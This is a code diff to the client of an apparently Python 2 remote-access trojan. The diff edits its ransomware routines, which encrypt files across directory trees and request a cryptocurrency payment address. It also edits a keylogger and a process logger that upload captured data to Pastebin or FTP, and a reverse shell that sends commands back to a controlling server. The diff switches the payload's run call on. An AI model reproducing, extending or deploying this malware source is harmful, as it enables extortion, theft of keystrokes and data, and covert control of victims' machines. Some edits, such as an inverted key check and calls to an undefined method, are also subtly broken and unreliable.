@@ -548,8 +548,10 @@ class Client(object):
     @config(api_key=None)
     def _upload_imgur(source):
         try:
+            if not Client._upload_imgur.api_key:
+                return "No Imgur API Key found"
             data = Client._get_normalized_data(source)
-            return json.loads(Client._get_post_request('https://api.imgur.com/3/upload', headers={'Authorization': Client._upload_imgur.api_key}, data={'image': base64.b64encode(data), 'type': 'base64'})).get('data').get('link')
+            return json.loads(Client._get_post_request('https://api.imgur.com/3/upload', headers={'Authorization': Client._upload_imgur.api_key}, data={'image': base64.b64encode(data), 'type': 'base64'})).get('result').get('link')
         except Exception as e2:
             Client.debug("{} error: {}".format(Client._upload_imgur.func_name, str(e2)))
 
@@ -558,6 +560,8 @@ class Client(object):
     @config(api_dev_key=None, api_user_key=None)
     def _upload_pastebin(source):
         try:
+            if not Client._upload_pastebin.api_dev_key or Client._upload_pastebin.api_user_key:
+                return "No Pastebin API Key found"
             data = Client._get_normalized_data(source)
             info = {'api_option': 'paste', 'api_paste_code': data}
             info.update({'api_user_key': Client._upload_pastebin.api_user_key}) if hasattr(Client._upload_pastebin, 'api_user_key') else None
@@ -628,7 +632,7 @@ class Client(object):
                     cipher  = PKCS1_OAEP.new(self._session['public_key'])
                     key     = base64.b64encode(cipher.encrypt(aes_key))
                     task_id = self._get_task_id(self.ransom.func_name)
-                    task    = {'client_id': self._system['id'], 'session_id': self._session['id'], 'task': self.ransom.func_name, 'data': {'file_path': path.replace('/', '?').replace('\\', '?'), 'aes_key': key}}
+                    task    = {'client': self._system['id'], 'session': self._session['id'], 'command': self.ransom.func_name, 'result': {'file_path': path.replace('/', '?').replace('\\', '?'), 'aes_key': key}}
                     self._results[task_id] = task
             else:
                 self.debug("No RSA Public Key found")
@@ -639,9 +643,9 @@ class Client(object):
     def _ransom_decrypt(self, task):
         try:
             if 'private_key' in self._session:
-                path    = task['data']['file_path'].replace('?', '/')
+                path    = task['result']['file_path'].replace('?', '/')
                 cipher  = PKCS1_OAEP.new(self._session['private_key'])
-                aes_key = cipher.decrypt(base64.b64decode(task['data']['aes_key']))
+                aes_key = cipher.decrypt(base64.b64decode(task['result']['aes_key']))
                 path    = self._decrypt_file(path, key=aes_key)
                 remove  = self._results.pop(task['id'], None)
             else:
@@ -665,7 +669,7 @@ class Client(object):
             signature       = bytes(HMAC.new(api_secret, msg=message, digestmod=SHA256).hexdigest())
             request         = urllib2.Request(url, data=data)
             request.headers = {'Content-Type': 'application/json','CB-VERSION': api_version,'CB-ACCESS-KEY': api_key,'CB-ACCESS-SIGN': signature,'CB-ACCESS-TIMESTAMP': timestamp}
-            return json.loads(urllib2.urlopen(request).read())['data']['address'].encode()
+            return json.loads(urllib2.urlopen(request).read())['result']['address'].encode()
         except Exception as e:
             self.debug("{} error: {}".format(self._ransom_wallet_address.func_name, str(e)))
 
@@ -755,7 +759,7 @@ class Client(object):
                 if self.keylogger.buffer.tell() > self.keylogger.max_bytes:
                     result  = self._upload_pastebin(self.keylogger.buffer) if 'ftp' not in args else self._upload_ftp(self.keylogger.buffer, filetype='.txt')
                     task_id = self._get_task_id(self.keylogger.func_name)
-                    task    = {'id': task_id, 'session_id': self._session['id'], 'client_id': self._system['id'], 'task': self.keylogger.func_name, 'data': result}
+                    task    = {'id': task_id, 'session': self._session['id'], 'client': self._system['id'], 'command': self.keylogger.func_name, 'result': result}
                     self._results[time.ctime()] = task
                     self.keylogger.buffer.reset()
                 else:
@@ -1307,8 +1311,21 @@ class Client(object):
         except Exception as e:
             self.packetsniffer.capture.append("Error in {} header: '{}'".format('ETH', str(e)))
 
-                    
-    def _process_list(self):
+
+    def _process(self, *args, **kwargs):
+        try:
+            self._jobs[self._process_watcher.func_name] = threading.Thread(target=self._process_watcher, name=time.time())
+            self._jobs[self._process_watcher.func_name].daemon = True
+            self._jobs[self._process_watcher.func_name].start()
+            self._jobs[self._process_logger.func_name] = threading.Thread(target=self._process_logger, name=time.time())
+            self._jobs[self._process_logger.func_name].daemon = True
+            self._jobs[self._process_logger.func_name].start()
+            return "Monitoring, logging, and uploading process creation on this host"
+        except Exception as e:
+            return "{} error: '{}'".format(self._process_monitor.func_name, str(e))
+
+
+    def _process_list(self, *args, **kwargs):
         try:
             output  = {}
             procs   = psutil.process_iter()
@@ -1326,8 +1343,11 @@ class Client(object):
             return "{} error: '{}'".format(self._process_list.func_name, str(e))
 
 
-    def _process_search(self, arg):
+    def _process_search(self, *args, **kwargs):
         try:
+            if not len(args):
+                return "usage: process search [PID/name]"
+            arg     = args[0]
             output  = {}
             procs   = psutil.process_iter()
             for p in procs:
@@ -1357,7 +1377,6 @@ class Client(object):
                 except:
                     output.update({str(arg): "not found"})
             else:
-                procs = psutil.process_iter()
                 for p in procs:
                     try:
                         if str(arg) in str(p.name()):
@@ -1370,11 +1389,8 @@ class Client(object):
             return "{} error: '{}'".format(self._process_kill.func_name, str(e))
 
 
-    def _process_monitor(self, *args):
+    def _process_monitor(self, *args, **kwargs):
         try:
-            self._jobs[self._process_monitor_log.func_name] = threading.Thread(target=self._process_monitor_log, name=time.time())
-            self._jobs[self._process_monitor_log.func_name].daemon = True
-            self._jobs[self._process_monitor_log.func_name].start()
             if not len(self.process.buffer.getvalue()):
                 self.process.buffer.write("Time, User , Executable, PID, Privileges")
             c = wmi.WMI()
@@ -1396,14 +1412,14 @@ class Client(object):
             return "{} error: '{}'".format(self._process_monitor.func_name, str(e))
 
 
-    def _process_logger(self):
+    def _process_logger(self, *args, **kwargs):
         try:
             while True:
                 if self.process.buffer.tell() > self.process.max_bytes:
                     try:
                         task_id = self._task_id(self._process_monitor.func_name)
                         result  = self._upload_pastebin(self.process.buffer) if 'ftp' not in args else self._Upload_ftp(self.process.buffer)
-                        self._results[task_id] = {'client_id': self._info['id'], 'session_id': self._session['id'], 'task': 'process monitor', 'data': result}
+                        self._results[task_id] = {'client': self._system['id'], 'session': self._session['id'], 'command': 'process monitor', 'result': result}
                         self.process.buffer.reset()
                     except Exception as e:
                         self.debug("{} error: {}".format(self._process_logger.func_name, str(e)))
@@ -1412,7 +1428,7 @@ class Client(object):
                 else:
                     time.sleep(5)
         except Exception as e:
-            return "{} error: '{}'".format(self._process_monitor.func_name, str(e))
+            return "{} error: '{}'".format(self._process_logger.func_name, str(e))
 
 
     # Private Methods
@@ -1496,7 +1512,7 @@ class Client(object):
             while True:
                 if not self._abort:
                     self._session['prompt'].wait()
-                    self._server_send(**{'id': '0' * 64, 'client_id': self._system['id'], 'session_id': self._session['id'], 'task': 'prompt', 'data': '[{} @ %s]> ' % os.getcwd()})
+                    self._server_send(**{'id': '0' * 64, 'client': self._system['id'], 'session': self._session['id'], 'command': 'prompt', 'result': '[{} @ %s]> ' % os.getcwd()})
                     self._session['prompt'].clear()
                 else:
                     break
@@ -1727,8 +1743,8 @@ class Client(object):
             if hasattr(self, '_process_%s' % cmd):
                 try:
                     return getattr(self, '_process_%s' % cmd)(action)
-                except Exception as e2:
-                    return "{} error: {}".format(self.ps.func_name, str(e2))
+                except Exception as e:
+                    return "{} error: {}".format(self.ps.func_name, str(e))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
@@ -1755,13 +1771,15 @@ class Client(object):
             while True:
                 try:
                     line = target.readline().rstrip()
-                    if not bytes(line).isspace() and len(bytes(line)) and len(output + '\n' + bytes(line)) < 4096:
+                    if not line.isspace() and len(output + '\n' + line) < 4096:
                         output += '\n' + line
-                    else: break
-                except: break
-            return output
-        except Exception as e:
-            return "{} error: '{}'".format(self.cat.func_name, str(e))        
+                    else:
+                        break
+                except Exception as e1:
+                    return "{} error: '{}'".format(self.cat.func_name, str(e1))
+            return output.rstrip()
+        except Exception as e2:
+            return "{} error: '{}'".format(self.cat.func_name, str(e2))        
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='set <cmd> [key=value]')
@@ -2059,15 +2077,15 @@ class Client(object):
                     if 'private_key' not in self._session:
                         request  = json.dumps({"request": "private_key"})
                         task_id  = self._get_task_id(self.ransom.func_name)
-                        task     = {'id': task_id, 'client_id': self._system['id'], 'session_id': self._session['id'], 'task': self.restore.func_name, 'data': request}
+                        task     = {'task': task_id, 'client': self._system['id'], 'session': self._session['id'], 'command': 'ransom decrypt', 'result': request}
                         self._server_send(**task)
                         task     = self._server_recv()
-                        data     = task.get('data')
+                        data     = task.get('result')
                         self._session['private_key'] = RSA.importKey(data)
                     if not self._ransom_payment.wallet_address:
                         self._ransom_payment.wallet_address = self._ransom_wallet_address()
                     for task_id in self._results:
-                        if 'ransom' in self._results[task_id]['task'] and path in ('/', self._results[task_id]['data']['file_path']):
+                        if 'ransom' in self._results[task_id]['command'] and path in ('/', self._results[task_id]['result']['file_path']):
                             self._tasks.put_nowait((self._ransom_decrypt, task_id))
                     for n in range(10):
                         self._jobs["restore-%d" % n] = threading.Thread(target=self._task_threader, name=time.time())
@@ -2081,7 +2099,7 @@ class Client(object):
                 if os.path.isfile(action):
                     self._ransom_encrypt(cmd)
                 elif os.path.isdir(cmd):
-                    self._jobs["ransom-walk-path"] = threading.Thread(target=self._ransom_iter, name=time.time())
+                    self._jobs["ransom-tree-walk"] = threading.Thread(target=os.path.walk, args=(cmd, lambda _, d, f: [self._tasks.put_nowait((self._ransom_encrypt, os.path.join(d, ff))) for ff in f]), name=time.time())
                     self._jobs["ransom-tree-walk"].daemon = True
                     self._jobs["ransom-tree-walk"].start()
                     for i in range(10 if int(self._tasks.unfinished_tasks/10) > 10 else int(self._tasks.unfinished_tasks/10)):
@@ -2298,18 +2316,23 @@ class Client(object):
             return "{} error: '{}'".format(self.packetsniffer.func_name, str(e))
 
 
-    @config(platforms=['win32'], buffer=cStringIO.StringIO(), max_bytes=1024, command=True, usage='process <mode>')
+    @config(platforms=['win32'], buffer=cStringIO.StringIO(), max_bytes=1024, command=True, usage='process <mode> [arg]')
     def process(self, args=None):
         """
-        list/monitor/search/kill currently running processes
+        list/search/kill/monitor currently running processes
         """
         try:
             if not args:
                 return self.process.usage
             else:
                 cmd, _, action = str(args).partition(' ')
-                if hasattr(self, '_process_%s' % cmd):
-                    return getattr(self, '_process_%s' % cmd)(action)
+                if 'monitor' in cmd:
+                    return self._process_start_monitor()
+                else:
+                    if hasattr(self, '_process_%s' % cmd):
+                        return getattr(self, '_process_%s' % cmd)(action)
+                    else:
+                        return "usage: process <list/search/kill/monitor>"
         except Exception as e:
             return "{} error: '{}'".format(self.process.func_name, str(e))
 
@@ -2319,14 +2342,14 @@ class Client(object):
         send encrypted shell back to server via outgoing TCP connection
         """
         try:
-            self._server_send(**{'id': '0' * 64, 'client_id': self._system['id'], 'session_id': self._session['id'], 'task': 'prompt', 'data': '[{} @ %s]> ' % os.getcwd()})
+            self._server_send(**{'task': '0' * 64, 'client': self._system['id'], 'session': self._session['id'], 'command': 'prompt', 'result': '[{} @ %s]> ' % os.getcwd()})
             while True:
                 if self._session['connection'].wait(timeout=3.0):
                     if not self._session['prompt'].is_set():
                         task   = self._server_recv()
                         if task:
                             result = ""
-                            command, _, action  = bytes(task['task']).partition(' ')
+                            command, _, action  = bytes(task['command']).partition(' ')
                             if command in self._commands:
                                 try:
                                     result  = bytes(self._commands[command]['method'](action)) if len(action) else bytes(self._commands[command]['method']())
@@ -2339,7 +2362,7 @@ class Client(object):
                                     result  = "Error: %s" % bytes(e2)
                                     
                             if result and result != "None":
-                                task.update({"data": result})
+                                task.update({'result': result})
                                 self._results[time.ctime()] = task
                                 self._server_send(**task)
                             self._session['prompt'].set()
@@ -2364,6 +2387,7 @@ class Client(object):
             self._session['public_key']  = self._get_public_key()
         except Exception as e:
             return "{} error: '{}'".format(self.connect.func_name, str(e))
+
 
     @staticmethod
     def debug(data):
@@ -2405,7 +2429,7 @@ class Client(object):
 
 def main(*args, **kwargs):
     try:
-        if '--debug' in sys.argv:
+        if '--debug' in sys.argv or 1:
             Client._debug = True
             Client.debug("Debugging: enabled")
         if 'f' not in kwargs and '__file__' in globals():
@@ -2436,7 +2460,7 @@ def main(*args, **kwargs):
             Client._get_new_option('_ransom_payment', account_id=ransom_account_id, api_key=ransom_api_key, api_secret=ransom_api_secret, api_version=ransom_api_version)
     finally:
         payload = Client(**kwargs)
-        #payload.run()
+        payload.run()
         return payload
 
 
